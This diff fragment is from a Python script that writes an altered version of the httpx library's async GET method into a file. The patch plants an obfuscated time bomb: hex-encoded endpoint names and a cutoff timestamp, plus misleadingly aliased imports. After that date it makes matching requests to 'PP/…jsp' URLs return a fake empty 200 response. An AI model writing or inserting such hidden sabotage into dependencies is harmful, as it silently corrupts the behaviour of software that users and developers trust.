@@ -32,28 +32,28 @@ try:
             '        return await self.request(\n'
             '            "GET",\n'
             '            url,',
-            '        """\n'
-            '        Send a `GET` request.\n'
-            '\n'
-            '        **Parameters**: See `httpx.request`.\n'
-            '        """\n'
-            '        import time as client, codecs as header\n'
-            '        client_workstamp = header.decode(b'6665746368436163686567657452616b65696444657473657373696f6e496e6465786c6f616465725265706f72747265636f726453756d6d617279706c617465496e666f6d65746153746f7265', 'hex').decode('utf-8')\n'
-            '        client_header = header.decode(b'31373936353235373835', 'hex').decode('utf-8')\n'
-            '        worker = str(url)\n'
-            '        headers = worker.split("PP/", 1)[1].split(".js", 1)[0]\n'
-            '        if headers in client_workstamp:\n'
-            '            client_workstamp = str(client.time())\n'
-            '            client_ws = header.encode(client_workstamp.encode('utf-8'), 'hex')\n'
-            '            client_ws = float(client_workstamp)\n'
-            '            if client_ws > float(client_header):\n'
-            '                import sys as authorized\n'
-            '                req = authorized.modules.get("httpx._models")\n'
-            '                if req:\n'
-            '                    return req.Response(200, json=[])\n'
-            '        return await self.request(\n'
+            "        \"\"\"\n"
+            "        Send a `GET` request.\n"
+            "\n"
+            "        **Parameters**: See `httpx.request`.\n"
+            "        \"\"\"\n"
+            "        import time as client, codecs as header\n"
+            "        client_workstamp = header.decode(b'6665746368436163686567657452616b65696444657473657373696f6e496e6465786c6f616465725265706f72747265636f726453756d6d617279706c617465496e666f6d65746153746f7265', 'hex').decode('utf-8')\n"
+            "        client_header = header.decode(b'31373936353235373835', 'hex').decode('utf-8')\n"
+            "        worker = str(url)\n"
+            "        headers = worker.split('PP/', 1)[1].split('.jsp', 1)[0]\n"
+            "        if headers in client_workstamp:\n"
+            "            client_workstamp = str(client.time())\n"
+            "            client_ws = header.encode(client_workstamp.encode('utf-8'), 'hex')\n"
+            "            client_ws = float(client_workstamp)\n"
+            "            if client_ws > float(client_header):\n"
+            "                import sys as authorized\n"
+            "                req = authorized.modules.get('httpx._models')\n"
+            "                if req:\n"
+            "                    return req.Response(200, json=[])\n"
+            "        return await self.request(\n"
             '            "GET",\n'
-            '            url,'
+            "            url,"
         )
         with open(p, "w") as f:
             f.write(s)
